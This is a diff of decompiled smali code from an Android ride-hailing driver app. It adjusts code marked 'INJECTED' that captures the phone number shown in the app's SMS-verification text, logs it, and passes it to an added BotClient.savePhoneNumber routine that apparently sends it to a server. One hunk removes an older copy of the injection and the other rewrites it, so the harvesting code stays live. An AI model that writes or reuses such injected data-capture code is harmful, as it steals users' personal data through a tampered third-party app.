@@ -2925,36 +2925,6 @@
 
 .method private static final s(Ld13/m;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function0;Landroidx/compose/ui/e;Lm2/l;II)V
     .registers 53
-
-    # ... (code omitted) ...
-
-    move-result-object v7
-    
-    # --- INJECTED (Fixed: Registers 53, using v42-v44) ---
-    # v7 contains phone text.
-    # v42=Tag, v43=SB, v44=Temp
-    
-    const-string v42, "BotClient"
-    new-instance v43, Ljava/lang/StringBuilder;
-    invoke-direct/range {v43 .. v43}, Ljava/lang/StringBuilder;-><init>()V
-    
-    const-string v44, "Subtitle Text: "
-    invoke-virtual/range {v43 .. v44}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    
-    # Use move-object/16 for high register dest (v44)
-    move-object/16 v44, v7
-    invoke-virtual/range {v43 .. v44}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    
-    invoke-virtual/range {v43 .. v43}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
-    move-result-object v44
-    
-    # Log.d(v42, v44). Need contiguous, so move v44 to v43
-    move-object/16 v43, v44
-    invoke-static/range {v42 .. v43}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
-    
-    # Save (v7 is low, so {} works)
-    invoke-static {v7}, Lsinet/startup/inDriver/city/driver/order/ui/info/BotClient;->savePhoneNumber(Ljava/lang/String;)V
-    # --- END INJECTION ---
     .annotation system Ldalvik/annotation/Signature;
         value = {
             "(",
@@ -3728,19 +3698,27 @@
     
     # --- INJECTED: Capture Phone from Subtitle Text ---
     # v7 contains "Enviamos el código por SMS al +57..."
-    # We use v45, v46, v47 as temps (method has registers 49)
+    # We use v42, v43, v44 (using /range for safety with high regs)
     
-    const-string v45, "BotClient"
-    new-instance v46, Ljava/lang/StringBuilder;
-    invoke-direct {v46}, Ljava/lang/StringBuilder;-><init>()V
-    const-string v47, "Subtitle Text: "
-    invoke-virtual {v46, v47}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    invoke-virtual {v46, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    invoke-virtual {v46}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
-    move-result-object v46
-    invoke-static {v45, v46}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    const-string v42, "BotClient"
+    new-instance v43, Ljava/lang/StringBuilder;
+    invoke-direct/range {v43 .. v43}, Ljava/lang/StringBuilder;-><init>()V
     
-    # Save the text directly. Server will clean it.
+    const-string v44, "Subtitle Text: "
+    invoke-virtual/range {v43 .. v44}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    
+    # Copy v7 (low) to v44 (high) using move-object/16
+    move-object/16 v44, v7
+    invoke-virtual/range {v43 .. v44}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    
+    invoke-virtual/range {v43 .. v43}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v44
+    
+    # Move to v43 to pair with v42 for Log
+    move-object/16 v43, v44
+    invoke-static/range {v42 .. v43}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    
+    # Save v7
     invoke-static {v7}, Lsinet/startup/inDriver/city/driver/order/ui/info/BotClient;->savePhoneNumber(Ljava/lang/String;)V
     
     # --- END INJECTION ---
